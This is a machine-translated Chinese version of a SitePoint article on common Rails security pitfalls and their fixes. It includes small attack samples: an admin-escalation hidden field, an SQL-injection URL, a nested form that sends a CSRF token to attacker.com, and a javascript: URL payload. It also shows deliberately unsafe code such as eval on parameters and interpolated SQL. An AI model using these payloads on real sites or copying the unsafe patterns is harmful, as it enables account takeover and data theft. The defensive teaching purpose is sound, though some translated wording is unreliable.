# 常见的 Rails 安全陷阱及其解决方案

> 原文：<https://www.sitepoint.com/common-rails-security-pitfalls-and-their-solutions/>

![](img/e35f3a4c5c2fd3198313dc5aeb4505fc.png)

Ruby on Rails 框架尽力保证您的安全。然而，正如[官方文档所暗示的](http://edgeguides.rubyonrails.org/security.html)，并不存在所谓的“即插即用安全”。因此，了解您可能遇到的常见(和不太常见)的安全陷阱非常重要。在本文中，我们将讨论其中的一些安全问题，以及使您的应用程序得到更多保护的步骤。

涵盖的主题:

*   批量分配
*   XSS 袭击
*   执行任意代码
*   SQL 注入
*   形成劫持
*   记录私人数据
*   公开私人令牌
*   通过 IFrame 嵌入网站
*   上传可执行文件
*   使用制动人员检测可能的问题

*这是对 2013 年 9 月 23 日发表的原始文章 [Rails 安全隐患](https://www.sitepoint.com/rails-security-pitfalls/)的重做。*

## 批量分配

这可能是最常见的安全隐患之一，所以我先列出来。批量赋值的意思是黑客试图一次更新数据库中的多个字段，包括那些不应该被普通用户修改的字段。

例如，假设您有一些表单来编辑用户的配置文件:

```
<%= form_for @user do |f| %>
  <%= f.label :name %>
  <%= f.text_field :name %>

  <%= f.label :surname %>
  <%= f.text_field :surname %>

  <%= f.submit %>
<% end %> 
```

好了，现在控制器的动作是:

```
def update
  @user = User.find(params[:id])
  if @user.update_attributes(params[:user])
    redirect_to some_path
  else
    render :edit
  end
end 
```

这看起来完全合法，但实际上，这是一个巨大的安全漏洞。如果`users`表有一个`admin`列，恶意的人可以用当前版本的控制器方法很容易地修改它。黑客需要做的唯一一件事就是在页面中手动添加一个隐藏字段，如下所示:

```
<input type="hidden" name="user[admin]" value="true"> 
```

猜猜会发生什么？黑客现在是管理员，因为我们很乐意让它发生。这确实非常糟糕，所以这就是为什么从版本 4 开始在 Rails 核心中引入了强参数。使用强参数，您可以将允许用户更改的属性列入白名单:

```
def update
  @user = User.find(params[:id])
  if @user.update_attributes(user_params)
    redirect_to some_path
  else
    render :edit
  end
end

private

def user_params
  params.require(:user).permit(:name, :surname)
end 
```

现在，只有名字和姓氏可以修改——其他任何参数都将被忽略。

如果您希望允许给定键下的所有参数，使用`permit!`方法:

```
params.require(:user).permit! 
```

但是，这样做时要极其小心。

在 Rails 3 之前的版本中，强参数还不是核心的一部分，所以我们必须坚持使用模型中指定的`attr_accessible`方法:

```
class MyModel
  attr_accessible :name, :surname
end 
```

## XSS 袭击

还记得柯南的父亲说的那句话吗:“在这个世界上，你不能相信任何人:男人，女人，野兽…”同样的概念也适用于网络。永远不要相信用户发送的任何数据，除非你的应用程序被一小群人使用或者仅供内部使用。实际上，即使在这种情况下，也不要相信你的用户，因为他们可能仅仅因为错误或者作为愚人节玩笑而做出一些残忍的事情。

从 rails 版本 3 开始，Rails 视图中的任何输出都被默认转义。有一种方法可以通过使用 [html_safe](http://api.rubyonrails.org/classes/String.html#method-i-html_safe) 方法来改变这种行为，但是在这样做的时候要非常小心:

```
# your controller
@blog_post = current_user.blog_posts.find_by(id: params[:id])

# your view
<%= @blog_post.body.html_safe %> 
```

如果任何人(不仅仅是你)被允许写博客文章，那么一个恶意的人可能会试图在文章的正文中插入一些 JavaScript，它会像任何其他脚本一样被处理。黑客可能会在您的站点上显示一些警告框，或者通过重写`window.location.href`属性将用户重定向到其他资源。一个更狡猾的攻击者可能会在你的网站上嵌入一个键盘记录器，并试图窃取用户的密码，这当然更糟糕。

因此，如果您在页面上显示用户生成的内容，千万不要直接对其应用`html_safe`方法。首先，使用 [sanitize](http://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html#method-i-sanitize) 方法并指定允许的标签列表:通常是用于格式化的标签，如`b`或`i`:

```
<%= sanitize(@blog_post.body, tags: %w(b strong em i)).html_safe %> 
```

还有一个名为 [Sanitize](https://github.com/rgrove/sanitize/) 的插件，它提供了一些高级的东西，如果你有这个问题，它会很有用。

## 执行任意代码

当您运行基于用户发送的信息动态生成的代码时要非常小心，因为您可能会引入严重的漏洞。这尤其适用于来自`ActiveSupport::Inflector`模块的方法或类似`eval`的方法，因为精心制作的参数可能会将您的系统暴露给攻击者。例如，这是*非常*不安全的，任何时候都应该避免:

```
eval(params[:id]) 
```

如果您真的需要根据用户的输入运行代码，请验证接收到的数据，并将允许的值列入白名单。

## SQL 注入

SQL 注入用于访问或操作用户无权更改的敏感数据。在大多数情况下，Rails 开发人员不会受到 SQL 注入的影响，例如

```
@user = User.find_by(id: params[:id]) 
```

默认情况下被清理(这同样适用于使用强参数。)然而，重要的是要记住，像这样的行动

```
@user = User.where("id = '#{params[:id]}'") 
```

*没有消毒*所以*千万不要做*！黑客可以构建下面的链接`http://yoursite.com/user?id=' OR 1 -`并有效地看到网站的所有用户(因为这个条件总是正确的。)

为了防止这种攻击，在复杂查询中使用插值和`?`符号:

```
@user = User.where("id = ?", params[:id]) 
```

在这种情况下，输入将被清理。现在，有了 Arel 作为 Rails 核心的一部分，查询就更容易编写了。例如:

```
@user = User.where("id = ? OR name = ?", params[:id], params[:name]) 
```

可以重写为:

```
@user = User.where(id: params[:id]).or(where(name: params[:name])) 
```

## 形成劫持

Rails 5 应用程序[为页面上的每个表单](https://github.com/rails/rails/pull/22275)添加一个 CSRF 令牌(在 Rails 5 之前，所有表单都只有一个令牌)。这样做是为了防止一种非常罕见的攻击，即黑客将自己的恶意表单插入合法表单:

```
<form method="post" action="//attacker.com/tokens">
  <form method="post" action="/legit_action">
  <input type="hidden" name="authenticity_token" value="thetoken">
</form> 
```

HTML 不允许嵌套`form`标签，因此恶意形式将取代合法形式，同时保留令牌。如果表单被提交，令牌将被发送到恶意网站。这种类型的攻击非常小众和狭隘，但值得了解。

新的 Rails 5 应用程序将`Rails.application.config.action_controller.per_form_csrf_tokens`选项设置为`true`，所以确保在从以前的版本迁移时也添加它。这个设置通常可以在*的 config/initializer/new _ framework _ defaults . Rb*文件中找到。

## 公开私人令牌

您的应用程序可能会使用一些私有令牌来与第三方 API 进行交互，或者启用 OAuth 2 身份验证。重要的是要非常小心地使用这些令牌，永远不要将它们暴露给公众(例如，在公共的 GitHub 存储库中)。最简单的方法是将它们提取到环境变量中，并使用像 [dotenv-rails](https://github.com/bkeepers/dotenv) 这样的宝石。使用 dotenv-rails，您可以创建一个名为*的文件。env* 并从版本控制中忽略它:

*。gitignore〔t1〕*

```
.env 
```

然后将您的令牌放在该文件中:

```
TWITTER_KEY=123
TWITTER_SECRET=456 
```

对于生产环境，这些变量通常在服务器配置文件中设置。对于 Heroku，使用以下命令:

```
$ heroku config:add TWITTER_KEY=123 TWITTER_SECRET=456 
```

在旧版本的 Rails 中，保护 cookies 的秘密令牌被列在*config/initializers/secret _ token . Rb*文件中，但现在不再是这样了。Rails 4 [引入了一个特殊的 *config/secrets.yml* 文件，该文件的生产令牌已经配置为使用 ENV 变量:](https://github.com/rails/rails/pull/13298)

```
production:
  secret_key_base: <%= ENV["SECRET_KEY_BASE"] %> 
```

顺便说一下，*不要忘记*来设置`secret_key_base`环境变量，因为否则任何人都可以篡改 cookies 的内容，这会导致严重的问题。另外，不要为`secret_key_base`设置一个简单的值，而是运行`rails secret`命令并使用生成的值。

## 记录私人数据

Rails 应用程序为您记录所有交互，这是一件好事。不好的一面是，有时私人数据也会被记录下来，任何有权访问服务器的人都可以获得这些数据。所述数据的例子包括用户的密码、卡号、CCV 号码等等。

您可能知道在*config/initializers/filter _ parameter _ logging . Rb*文件中定义了一个`Rails.application.config.filter_parameters`设置。最初看起来是这样的:

```
Rails.application.config.filter_parameters += [:password] 
```

但是，如果您的应用程序处理其他敏感数据，请确保相应地更新此设置。请注意，这里的字符串和符号被自动转换为正则表达式，因此任何包含“password”的字段都将被过滤掉，并替换为`[FILTERED]`文本。

## 通过 HTTP 发送敏感数据

这听起来可能很明显，但我仍然想指出一个事实，即敏感数据*永远不应该*通过普通 HTTP 传输。例如，假设您设置了非常简单的 HTTP 基本身份验证，如下所示:

```
class SomeController < ApplicationController
  before_action :authenticate!
  private
  def authenticate!
    authenticate_or_request_with_http_basic do |id, password|
        name == 'admin' && password == '12345'
    end
  end
end 
```

如果连接没有加密，黑客可以使用 Wireshark 之类的工具轻易地伪造用户名和密码。因此，您必须对当前控制器实施 SSL

```
class SomeController < ApplicationController
  force_ssl
  before_action :authenticate!
  #...
end 
```

`force_ssl`方法接受`if`和`unless`选项来设置条件。此外，通过设置，可以对整个应用程序实施 SSL

```
config.force_ssl = true 
```

在 *config/application.rb* 里面。

## 上传可执行文件

许多应用程序允许用户上传他们的文件，如图像或文本文档。然而，在这样做的时候，验证文件的大小是非常重要的，并且对可执行文件和脚本要非常小心。

黑客可能会试图将恶意文件上传到您的服务器，该文件可能会自动执行，从而导致非常严重的问题。例如，当上传的文件被放在 *public* 目录中，并且该目录也被设置为 Apache 的根目录时，就会出现这种情况。

像[回形针](https://github.com/thoughtbot/paperclip/)、 [Carrierwave](https://github.com/carrierwaveuploader/carrierwave) 、[蜻蜓](https://github.com/markevans/dragonfly)等流行的解决方案都提供了验证机制，所以在实现文件上传功能时一定要查看他们的文档。

## 正则表达式

不熟悉 Ruby 语言的程序员通常将正则表达式中的`^`和`$`符号视为字符串的开始和结束。然而实际上，这些符号表示的是*线*的起点和终点，而不是整个字符串。因此，这个用来验证用户输入的 URL 的正则表达式:

```
/^https?:\/\/[^\n]+$/i 
```

不是很安全，因为黑客可以免费提供

```
javascript:some_bad_code();/*
http://anything.com
*/ 
```

从正则表达式的角度来看，这将是一个正确的 URL。如果稍后您将这个 URL(存储在`website`列中)插入视图:

```
link_to "User's website", @user.website 
```

任何点击此链接的人都将有效地运行恶意 JavaScript 代码。为了防止这种攻击，使用对应于字符串开始和结束的`\A`和`\z`符号，而不是`^`和`$`:

```
/\Ahttps?:\/\/[^\n]+\z/i 
```

有趣的是，较新的 Rails 应用程序意识到了这一常见错误，当您在正则表达式中使用`^`和`$`符号时，格式验证器(`validates :some_column, format: {...}`)会引发一个错误。如果你绝对确定你需要这些符号，而不是`\A`和`\z`，那么在创建这个验证器的时候将`multipart`选项设置为`true`。

顺便说一下，要在线测试你的正则表达式，你可以使用一个名为 [Rubular](http://rubular.com/) 的网站。

## 通过 IFrame 嵌入网站

最后，让我告诉你一种不太常见但非常有趣的攻击类型。默认情况下，您的网站可以使用 iframe 嵌入到任何其他资源中:

```
<iframe src="http://your-resource.com"> 
```

看起来这里没什么问题。然而，假设您的网站有一个更改用户密码的页面。它有两个字段(密码和密码确认)以及提交按钮。

黑客随后创建了一个类似“winiphone7.com”的网站，声称完全合法。在这个网站上，他们显示了两个文本字段和一个按钮，它们的位置和宽度与您网站上的元素相同(特别是在“更改密码”页面上)。它们还通过 Iframe 嵌入你的应用程序，但是借助于`opacity` style 属性使它不可见。然后，这个 Iframe 被精确地放置在文本字段和提交按钮上。然后黑客写下类似这样的话:“键入短语‘我要 iPhone 7！！！”并按下“提交”按钮。然后，您将参与我们的赠品，并有很大的机会赢得一部新 iPhone！P.S .别担心，所有打字都会被隐藏起来”。

你明白我的意思吗？

用户会认为他们在 winiphone7.com 网站的字段中输入了一些文本，但实际上，他们在你的网站上更改了密码，设置为“我想要 iPhone 7！！!"。

当然，这种类型的攻击并不普遍，也不太可能成功:大多数用户会怀疑他们的输入是隐藏的。此外，只有当他们在你的网站上的会话仍然活跃时，它才会起作用。

尽管如此，请记住这种可能性，不要通过在 *config/application.rb* 文件中设置`X-Frame-Options` HTTP 头来将网站嵌入到其他资源中，如下所示:

```
config.action_dispatch.default_headers = {
    'X-Frame-Options' => 'SAMEORIGIN'
} 
```

默认情况下，较新的 Rails 应用程序用这个头进行响应。

## 使用 Brakeman 评估您的应用

Brakeman 是一个流行的宝石，它可以扫描你的应用程序中常见的安全问题。将其添加到*gem 文件*:

```
group :development do
  gem 'brakeman', require: false
end 
```

安装新的 gem:

```
$ bundle install 
```

然后，您可以通过执行`brakeman`命令来运行它。扫描完成后，Brakeman 会以一种或多种支持的格式(支持 HTML、Markdown、CSV、JSON 等)为您呈现一份报告。

例如，要生成 HTML 报告，请设置`-f`键:

```
$ brakeman -f html 
```

或者指定带有正确扩展名的文件名:

```
$ brakeman -o output.html 
```

Brakeman 用高、中或弱标签标记每个发现的漏洞，以记录置信水平(即该警告成为实际问题的可能性)。但是，请注意，这个工具并不完美，不可能发现所有潜在的问题，因此不要仅仅依赖它的输出！

## 结论

我们已经到了这篇文章的结尾。当然，应用程序可能会有更多的安全问题，因此在发布到产品之前对其进行评估是很重要的。花些时间阅读官方安全指南，并使用 Brakeman 帮助你寻找漏洞。

如果你知道其他常见的安全问题，请在评论中分享，以帮助你的开发伙伴。感谢您阅读本文，并保持安全！

## 分享这篇文章